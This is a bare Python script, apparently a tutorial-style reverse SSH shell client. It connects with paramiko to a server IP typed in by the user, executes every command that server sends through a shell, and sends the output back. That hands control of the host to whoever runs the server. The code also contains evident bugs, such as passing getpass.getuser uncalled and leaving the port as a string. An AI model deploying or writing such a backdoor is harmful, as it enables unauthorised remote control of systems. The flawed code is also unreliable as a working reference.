import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    #accept SSH key for target host if not already known
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())
        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd_dc = cmd.decode()
                if cmd_dc.lower() == 'exit':
                    client.close()
                    break
                else:
                    cmd_output = subprocess.check_output(shlex.split(cmd_dc), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')